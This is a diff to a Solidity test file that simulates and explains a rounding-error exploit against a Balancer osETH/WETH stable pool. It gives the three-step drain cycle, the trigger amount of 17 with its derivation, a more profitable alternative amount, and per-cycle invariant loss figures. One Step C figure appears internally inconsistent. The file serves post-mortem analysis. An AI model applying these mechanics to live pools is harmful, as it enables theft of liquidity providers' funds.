@@ -53,8 +53,17 @@ import "../StableMath.sol";
 //            Attacker pays amountIn = 625,492 W (vs 1,041,412 in FIXED),
 //            i.e. UNDERPAYS by 415,920 W. Vault settles to (999845, 1)
 //            which has measured D = 112,405, a -26,551 LOSS per cycle.
-//   Step C : osETH -> WETH (recycle), restores most osETH but locks in the D loss
-//            (the asymmetric mulDown defect does not fire on this leg).
+//   Step C : osETH -> WETH (recycle), DOES NOT return the pool to (67000,67000).
+//            The mulDown defect does not fire on this leg (see finding #11),
+//            so D moves only by fee/round drift (+692 in the toy cycle, vs the
+//            -26,551 stolen in Step B). The exact (W, O) end-state depends on
+//            the recycle out-amount the attacker chooses; in the real PoC the
+//            Helper.swapGivenOut budgets it precisely so that after many cycles
+//            the pool's (W, O) drifts back into the trading band, while the
+//            -26,551 D-loss per Step B has already been LOCKED IN and cannot
+//            be recovered. testDiag_fullCycleInternals (toy trim() heuristic)
+//            ends one cycle at (W=108845, O=5183, D=113097), confirming D
+//            stays ~26k below D_pre and (W, O) does NOT return to initial.
 //
 // Repeated ~30+ times in the PoC, then converted into BPT arbitrage in Phase 3
 // to extract the cumulated D-loss as actual token profit.
@@ -170,6 +179,107 @@ import "../StableMath.sol";
 //    Total: +106. Verified per-step in the test prints. No numerical bug,
 //    purely the contract's "round in favour of the LP" pipeline acting on
 //    top of the Newton solution.
+//
+// 9. testDiag_inverseHintAndFeeBreakdown -- Q3: BUGGY is ISOMORPHIC to FIXED
+//    Both BUGGY and FIXED W_post are produced by the SAME Newton solver on
+//    the SAME invariant=138,956 -- they only differ in which O_up slot is
+//    fed into Newton:
+//      FIXED  Newton input: balances = [up_W_pre=374353, O_up=1]
+//             newW=1,415,659; +1 (.add(1)) + 105 (fee divUp) = W_post=1,415,765
+//      BUGGY  Newton input: balances = [up_W_pre=374353, O_up=2]
+//             newW=  999,781; +1 (.add(1)) +  63 (fee divUp) = W_post=  999,845
+//    The only divergence is the O_up slot:
+//      FIXED uses mulUp(17, sf) = 18 -> 19 - 18 = 1
+//      BUGGY uses mulDown(17, sf) = 17 -> 19 - 17 = 2
+//    so 999,845 IS the back-solve of D=138,956, just on the WRONG iso-curve
+//    (the one that assumes the OUT slot ends at O_up=2 instead of the truer 1).
+//    Verified by simSwap sanity check matching W_post in both modes exactly.
+//
+// 10. testDiag_inverseHintAndFeeBreakdown -- Q4: where the 26,551 D loss lives
+//    Independent _calculateInvariant on the two views of the BUGGY landing:
+//      curve-imagined (W_up=999845, O_up=2):  D = 140,132
+//      vault-actual   (W_up=999845, O_up=1):  D = 112,405
+//      D_pre (Step A end):                    D = 138,956
+//    So per-cycle theft = D_pre - D_vault = 26,551, while the "curve thinks
+//    we are here" point sits at D=140,132 (slightly above 138,956 because the
+//    +1 + fee markup pushes W past Newton's exact 999,781). The 27,727 gap
+//    between curve and vault D values at the W=999,845 point IS the geometric
+//    expression of the rounding theft. Curve under-charges the user by ~415,920
+//    upscaled W units (= 1,415,765 - 999,845) per cycle; that "missing W"
+//    becomes "missing D" because the vault settles on a strictly lower iso-curve.
+//
+// 11. testDiag_fullCycleInternals -- per-step Curve view vs Vault view print
+//    Runs ONE complete A-B-C cycle in BUGGY mode from (W=67000, O=67000) and
+//    prints, at every step, both the Newton input the curve actually sees and
+//    the raw/upscaled balances the vault actually records. Verified numbers
+//    (no inference, all from on-chain StableMath calls):
+//
+//      ---- Step A (W->O, out=66982) ----
+//        outUp = mulDown(66982, sf) = 70,875
+//        Newton input = (W_up=67000, O_up=70894-70875=19)
+//        Newton newW  = 374,321 ; inUp=307,322 ; +fee delta=+31 -> inRaw=307,353
+//        Vault post   = (W=374353, O=18) ; up=(374353, 19)
+//        Curve imag.  = (W_up=374322, O_up=19)
+//        GAP W = -31  (fee markup)        GAP O = 0   (no mulDown trigger)
+//        D: 137,893 -> 138,956  (+1063 = fee accrual to LPs, NORMAL)
+//
+//      ---- Step B (W->O, out=17, TRIGGER) ----
+//        outUp = mulDown(17, sf) = 17     (loses 0.988 upscaled units)
+//        Newton input = (W_up=374353, O_up=19-17=2)   <-- WRONG O_up
+//        Newton newW  = 999,781 ; inUp=625,429 ; +fee delta=+63 -> inRaw=625,492
+//        Vault post   = (W=999845, O=1) ; up=(999845, 1)
+//        Curve imag.  = (W_up=999782, O_up=2)
+//        GAP W = -63  (fee markup, NORMAL)
+//        GAP O = +1   <-- ACTUAL BUG: curve thinks O_up=2, vault has O_up=1
+//        D: 138,956 -> 112,405 (-26,551 STOLEN)
+//
+//      ---- Step C (O->W, out=trim(W)=990000 reverts, retry 891000) ----
+//        outUp = mulDown(891000, sf=1e18) = 891000
+//        Newton input = (W_up=108845, O_up=1)         <-- O_up=1 already
+//        Newton newW  = 5,482 ; inUp=5,482 ; +fee delta=+1 -> inRaw=5,182
+//        Vault post   = (W=108845, O=5183) ; up=(108845, 5484)
+//        GAP W = -1   (fee markup)        GAP O = 0   (no mulDown trigger)
+//        D: 112,405 -> 113,097 (+692 fee creep, does NOT recover the -26,551)
+//
+//      Final: (W=108845, O=5183, D=113097) -- 41,845 W above init, 61,817 O
+//      below init. Step C does NOT return to (67000, 67000) under the toy
+//      trim() heuristic; the real PoC budgets recycle precisely via
+//      Helper.swapGivenOut. Either way, Step B's D loss is permanent.
+//
+// 12. testDiag_fullCycleInternals -- "fee gap" vs "bug gap" are different things
+//    The W gap (curve_imagined - vault_post) shows up in EVERY swap (A: -31,
+//    B: -63, C: -1) and is purely the LP fee markup: _swapGivenOut runs
+//    inRaw = divUp(inRaw, 1 - fee) AFTER the curve's _calcInGivenOut, and the
+//    resulting inRaw is recorded into the vault balance. So vault W ends up
+//    "fee delta" units above the Newton-self-consistent W. This is INTENDED
+//    LP yield; it slightly INCREASES D (Step A: +1063, Step C: +692).
+//
+//    The O gap (curve_imagined - vault_post) is only nonzero when the floor
+//    subadditivity defect fires (Step B: +1, A and C: 0). This is the BUG.
+//    Curve: O_up_post_curve = up_pre[O] - mulDown(outAmt, sf)
+//    Vault: O_up_post_vault = mulDown(bal_pre[O] - outAmt, sf)
+//    Their difference is exactly  floor((a+b)*sf) - floor(a*sf) - floor(b*sf)
+//    with a = bal_pre[O] - outAmt, b = outAmt, hard-bounded to {0, 1}.
+//    Equivalently, gap_O = 1 iff  {a*sf} + {b*sf} >= 1  (fractional carry).
+//
+//    FIXED-mode comparison on the same Step B confirms the partition:
+//      W gap = -105 (even larger fee markup), O gap = 0, D drop = -105 only.
+//    So the O gap is the entire vulnerability; the W gap is normal LP fee
+//    accounting that exists in both BUGGY and FIXED.
+//
+// 13. The "trickAmt = 17 is smallest possible" claim, derived (consistent
+//    with Wong's blog formula floor(1e18 / (sf - 1e18)) = 17):
+//    Let sf = 1 + eps with eps = 0.058132408689971699. For raw n and small
+//    n*eps < 1, {n*sf} = {n*eps} = n*eps. Triggering gap = 1 in Step B
+//    (where a = bal_pre[O] - n is forced to 1 by the Step A drain formula
+//    -trickAmt - 1) requires:
+//      {a*sf} + {n*sf}  >=  1
+//      0.0581 + n*eps   >=  1
+//      n                >=  ceil(0.9419 / 0.0581)  =  17
+//    Larger gap=1 candidates: 17, 34, 51, 68, 86, 103, 120, ... (every ~17
+//    raw units, since {n*eps} cycles past 1 - {sf} once every 1/eps ~= 17.2).
+//    PoC chose 17 because it is the smallest, not because it maximizes |dD|
+//    (testDiag_trickAmtOptimum: 103 actually wins by ~3% on |dD|/cost).
 // =============================================================================
 
 address constant balancer_d = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
@@ -1334,6 +1444,72 @@ contract DiagSim is Test {
         bal_pre[0] = W_pre; bal_pre[1] = O_pre;
         uint256[] memory bal_post = simSwapGivenOut(bal_pre, sf, 0, 1, outRaw, amp, fee, 1);
         emit log_named_uint("  simSwap FIXED W_post (sanity check)", bal_post[0]);
+
+        // ---- Q3: BUGGY path -- is 999,845 also derived from D=138,956? ----
+        // Earlier I claimed "999,845 is not the back-solve of any D". That was
+        // wrong. _calcInGivenOut DOES call the INVERSE Newton with the same
+        // invariant=138,956 in the BUGGY path -- only the OUT slot fed into
+        // Newton differs (mulDown(17,sf)=17 -> O_up=2 instead of mulUp=18 ->
+        // O_up=1). So the BUGGY 999,845 is structurally the same construction
+        // as FIXED 1,415,765, just on the wrong O_up=2 iso-curve, with the
+        // same +1 round-up + fee divUp markup applied on top.
+        emit log_string("");
+        emit log_string("=== Q3: BUGGY 999,845 = INVERSE Newton(D=138956,O_up=2) + markup ===");
+        uint256 outUp_buggy = outRaw.mulDown(sf[1]);                 // BUGGY mode = mulDown
+        emit log_named_uint("  outUp (mulDown(17,sf))", outUp_buggy);
+        uint256[] memory bal_for_newton_b = new uint256[](2);
+        bal_for_newton_b[0] = up[0];                                 // hint = up_W_pre
+        bal_for_newton_b[1] = up[1] - outUp_buggy;                   // O_up after subtracting outUp
+        emit log_named_uint("  hint W (= up_W_pre)", bal_for_newton_b[0]);
+        emit log_named_uint("  O_up after subtracting outUp_buggy", bal_for_newton_b[1]);
+
+        uint256 newW_b = StableMath._getTokenBalanceGivenInvariantAndAllOtherBalances(
+            amp, bal_for_newton_b, D_pre, 0
+        );
+        emit log_named_uint("  STANDALONE Newton newW (D=138956, O_up=2)", newW_b);
+
+        uint256 inUp_b      = newW_b - up[0] + 1;                    // _calcInGivenOut .add(1)
+        uint256 inRaw_nf_b  = inUp_b.divUp(sf[0]);                   // sf[WETH] identity
+        uint256 inRaw_wf_b  = inRaw_nf_b.divUp(ONE - fee);           // fee divUp
+        uint256 W_post_b    = W_pre + inRaw_wf_b;
+        emit log_named_uint("  inUp = newW - up_W_pre + 1", inUp_b);
+        emit log_named_uint("  inRaw before fee", inRaw_nf_b);
+        emit log_named_uint("  inRaw after  fee", inRaw_wf_b);
+        emit log_named_uint("  fee adjustment delta", inRaw_wf_b - inRaw_nf_b);
+        emit log_named_uint("  W_post = W_pre + inRaw (claim: 999845)", W_post_b);
+        emit log_named_uint("  total markup vs newW = W_post - newW", W_post_b - newW_b);
+
+        // simSwap BUGGY sanity check
+        uint256[] memory bal_pre_b = new uint256[](2);
+        bal_pre_b[0] = W_pre; bal_pre_b[1] = O_pre;
+        uint256[] memory bal_post_b = simSwapGivenOut(bal_pre_b, sf, 0, 1, outRaw, amp, fee, 0);
+        emit log_named_uint("  simSwap BUGGY W_post (sanity check)", bal_post_b[0]);
+
+        emit log_string("");
+        emit log_string("=== CONCLUSION: BUGGY and FIXED W_post share the SAME construction ===");
+        emit log_string("  BUGGY: Newton(D=138956, O_up=2) + 1 + fee divUp -> 999,845");
+        emit log_string("  FIXED: Newton(D=138956, O_up=1) + 1 + fee divUp -> 1,415,765");
+        emit log_string("  Difference = which O_up iso-curve Newton was anchored on.");
+
+        // ---- Q4: prove the D-loss geometry ----
+        // Curve "imagined" landing  : (W_up=999845, O_up=2)  -> D should be ~ 138,956
+        //                             (slightly higher because of +1+fee markup pushing W
+        //                             slightly past Newton's exact 999,781)
+        // Vault "actual" landing     : (W_up=999845, O_up=1)  -> D should be ~ 112,405
+        //                             (-26,551 vs original 138,956 = the per-cycle theft)
+        emit log_string("");
+        emit log_string("=== Q4: D at curve-imagined vs vault-actual landing ===");
+        (bool ok_curve, uint256 D_curve) = _safeInv(amp, 999845, 2);
+        (bool ok_vault, uint256 D_vault) = _safeInv(amp, 999845, 1);
+        if (ok_curve) emit log_named_uint("  D at (999845, O_up=2)  curve view ", D_curve);
+        else          emit log_string  ("  D at (999845, O_up=2)  curve view : NEWTON DIVERGED");
+        if (ok_vault) emit log_named_uint("  D at (999845, O_up=1)  vault view ", D_vault);
+        else          emit log_string  ("  D at (999845, O_up=1)  vault view : NEWTON DIVERGED");
+        if (ok_curve && ok_vault) {
+            emit log_named_uint("  D_pre (Step A end)               ", D_pre);
+            emit log_named_int ("  dD = D_vault - D_pre              ", int256(D_vault) - int256(D_pre));
+            emit log_named_int ("  curve-vs-vault D gap (= theft)    ", int256(D_curve) - int256(D_vault));
+        }
     }
 
     // Question: does the leak need to be MAXIMIZED, or just need to cross the
@@ -1366,5 +1542,172 @@ contract DiagSim is Test {
             emit log_string("==== FAIL-THRESHOLD CANDIDATE ====");
             _stepBCompareOne(sf, amp, fee, bad[i]);
         }
+    }
+
+    // -----------------------------------------------------------------------
+    // testDiag_fullCycleInternals
+    //   Runs ONE complete A -> B -> C cycle in BUGGY mode starting at
+    //   (W=67000, O=67000) and prints, at every step:
+    //     - VAULT view : raw bal pre, raw bal post, upscaled bal pre/post
+    //                    (matches _upscaleArray = mulDown for both slots)
+    //     - CURVE view : outUp (mulDown(outAmt, sf[idxOut])),
+    //                    inv used by the curve, the [W_up, O_up] vector
+    //                    actually fed into the INVERSE Newton solver
+    //                    (i.e. up_post_curve_view = up_pre with O_up -= outUp),
+    //                    raw Newton output, then +1 + fee divUp pipeline.
+    //   The point: do NOT assume Step C returns to (67000, 67000); print it.
+    // -----------------------------------------------------------------------
+    function testDiag_fullCycleInternals() public {
+        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
+        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
+        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
+        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();
+
+        uint256[] memory sf = new uint256[](2);
+        sf[0] = rawSf[0]; sf[1] = rawSf[2];
+        emit log_named_uint("sf[WETH] ", sf[0]);
+        emit log_named_uint("sf[osETH]", sf[1]);
+        emit log_named_uint("fee (1e18)", fee);
+
+        uint256[] memory bal = new uint256[](2);
+        bal[0] = 67000; bal[1] = 67000;
+        uint256 trickAmt = 17;
+
+        emit log_string("");
+        emit log_string("########## INITIAL ##########");
+        _printState("init", bal, sf, amp);
+
+        // ---- Step A: WETH -> osETH out = (O_pre - trickAmt - 1) ----
+        emit log_string("");
+        emit log_string("########## STEP A (WETH -> osETH, drain to O=trickAmt+1=18) ##########");
+        bal = _verboseSwap(bal, sf, 0, 1, bal[1] - trickAmt - 1, amp, fee, 0);
+        _printState("after A", bal, sf, amp);
+
+        // ---- Step B: WETH -> osETH out = trickAmt = 17 (TRIGGER) ----
+        emit log_string("");
+        emit log_string("########## STEP B (WETH -> osETH, out = trickAmt = 17, TRIGGER) ##########");
+        bal = _verboseSwap(bal, sf, 0, 1, trickAmt, amp, fee, 0);
+        _printState("after B", bal, sf, amp);
+
+        // ---- Step C: osETH -> WETH out = trim(W) (recycle) ----
+        emit log_string("");
+        emit log_string("########## STEP C (osETH -> WETH, out = trim(W), recycle) ##########");
+        uint256 want = trim(bal[0]);
+        bool ok = false;
+        for (uint256 j = 0; j < 5; j++) {
+            try this.ext_verboseSwap(bal, sf, 1, 0, want, amp, fee, 0) returns (uint256[] memory nb) {
+                bal = nb; ok = true; break;
+            } catch { want = want * 9 / 10; }
+        }
+        require(ok, "Step C failed all retries");
+        _printState("after C", bal, sf, amp);
+
+        // ---- Final verdict ----
+        emit log_string("");
+        emit log_string("########## VERDICT ##########");
+        emit log_named_uint("final W (raw)", bal[0]);
+        emit log_named_uint("final O (raw)", bal[1]);
+        emit log_named_int ("delta W vs init 67000", int256(bal[0]) - int256(67000));
+        emit log_named_int ("delta O vs init 67000", int256(bal[1]) - int256(67000));
+    }
+
+    function ext_verboseSwap(
+        uint256[] memory bal, uint256[] memory sf,
+        uint256 idxIn, uint256 idxOut, uint256 outAmt,
+        uint256 amp, uint256 fee, uint8 mode
+    ) external returns (uint256[] memory) {
+        return _verboseSwap(bal, sf, idxIn, idxOut, outAmt, amp, fee, mode);
+    }
+
+    function _printState(string memory tag, uint256[] memory bal, uint256[] memory sf, uint256 amp)
+        internal
+    {
+        uint256[] memory up = new uint256[](2);
+        up[0] = bal[0].mulDown(sf[0]);
+        up[1] = bal[1].mulDown(sf[1]);
+        uint256 D = StableMath._calculateInvariant(amp, up);
+        emit log_named_string("--- state @", tag);
+        emit log_named_uint("  raw W", bal[0]);
+        emit log_named_uint("  raw O", bal[1]);
+        emit log_named_uint("  up  W (vault re-upscale = mulDown)", up[0]);
+        emit log_named_uint("  up  O (vault re-upscale = mulDown)", up[1]);
+        emit log_named_uint("  D (vault view)", D);
+    }
+
+    // Verbose mirror of simSwapGivenOut. Prints both views step by step.
+    function _verboseSwap(
+        uint256[] memory bal, uint256[] memory sf,
+        uint256 idxIn, uint256 idxOut, uint256 outAmt,
+        uint256 amp, uint256 fee, uint8 mode
+    ) internal returns (uint256[] memory) {
+        emit log_named_uint("  outAmt (raw)", outAmt);
+        emit log_named_uint("  idxIn ", idxIn);
+        emit log_named_uint("  idxOut", idxOut);
+
+        // ---- VAULT view (pre-swap) ----
+        uint256[] memory up = new uint256[](2);
+        up[0] = bal[0].mulDown(sf[0]);
+        up[1] = bal[1].mulDown(sf[1]);
+        emit log_string  ("  [vault pre]");
+        emit log_named_uint("    raw W", bal[0]);
+        emit log_named_uint("    raw O", bal[1]);
+        emit log_named_uint("    up  W", up[0]);
+        emit log_named_uint("    up  O", up[1]);
+
+        // ---- CURVE view (Newton input) ----
+        uint256 outUp = (mode == 0) ? outAmt.mulDown(sf[idxOut]) : outAmt.mulUp(sf[idxOut]);
+        uint256 inv   = StableMath._calculateInvariant(amp, up);
+        uint256[] memory upCurve = new uint256[](2);
+        upCurve[0] = up[0]; upCurve[1] = up[1];
+        upCurve[idxOut] = upCurve[idxOut] - outUp;          // what Newton actually sees
+        emit log_string  ("  [curve _calcInGivenOut input]");
+        emit log_named_uint("    outUp (mulDown sf if BUGGY, else mulUp)", outUp);
+        emit log_named_uint("    inv used by curve (D_pre vault-view)   ", inv);
+        emit log_named_uint("    Newton input W_up                       ", upCurve[0]);
+        emit log_named_uint("    Newton input O_up (= up_pre - outUp)    ", upCurve[1]);
+
+        // call _calcInGivenOut for the FULL inUp (= newW - W_up + 1)
+        uint256 inUp = StableMath._calcInGivenOut(amp, up, idxIn, idxOut, outUp, inv);
+        // re-derive Newton's raw output (without the .add(1))
+        uint256 newSlot = inUp - 1 + upCurve[idxIn];
+        emit log_named_uint("    Newton raw output (newBal slot)         ", newSlot);
+        emit log_named_uint("    inUp = newBal - W_up + 1                ", inUp);
+
+        // ---- fee pipeline ----
+        uint256 inRawNoFee = inUp.divUp(sf[idxIn]);
+        uint256 inRaw      = inRawNoFee.divUp(ONE - fee);
+        emit log_string  ("  [downscale + fee]");
+        emit log_named_uint("    inRaw before fee = divUp(inUp, sf[in]) ", inRawNoFee);
+        emit log_named_uint("    inRaw after  fee = divUp(., 1 - fee)   ", inRaw);
+        emit log_named_uint("    fee delta                              ", inRaw - inRawNoFee);
+
+        // ---- VAULT view (post-swap) ----
+        bal[idxIn]  = bal[idxIn]  + inRaw;
+        bal[idxOut] = bal[idxOut] - outAmt;
+        uint256[] memory up2 = new uint256[](2);
+        up2[0] = bal[0].mulDown(sf[0]);
+        up2[1] = bal[1].mulDown(sf[1]);
+        emit log_string  ("  [vault post]");
+        emit log_named_uint("    raw W", bal[0]);
+        emit log_named_uint("    raw O", bal[1]);
+        emit log_named_uint("    up  W (vault re-upscale = mulDown)", up2[0]);
+        emit log_named_uint("    up  O (vault re-upscale = mulDown)", up2[1]);
+
+        // Curve "thought" the post-state was:
+        //   W slot = W_up + inUp           (BEFORE divUp/fee so >= up2[0])
+        //   O slot = up[idxOut] - outUp    (= upCurve[idxOut])
+        uint256 W_up_curve_imag = upCurve[idxIn] + inUp;
+        uint256 O_up_curve_imag = upCurve[idxOut];
+        emit log_string  ("  [curve imagined post-state]");
+        emit log_named_uint("    W_up (curve imagined = pre + inUp)       ", W_up_curve_imag);
+        emit log_named_uint("    O_up (curve imagined = pre - outUp)      ", O_up_curve_imag);
+
+        // delta vs vault: this is the structural mismatch
+        emit log_named_int ("    GAP W: curve_imagined - vault_post       ",
+            int256(W_up_curve_imag) - int256(up2[idxIn]));
+        emit log_named_int ("    GAP O: curve_imagined - vault_post       ",
+            int256(O_up_curve_imag) - int256(up2[idxOut]));
+
+        return bal;
     }
 }
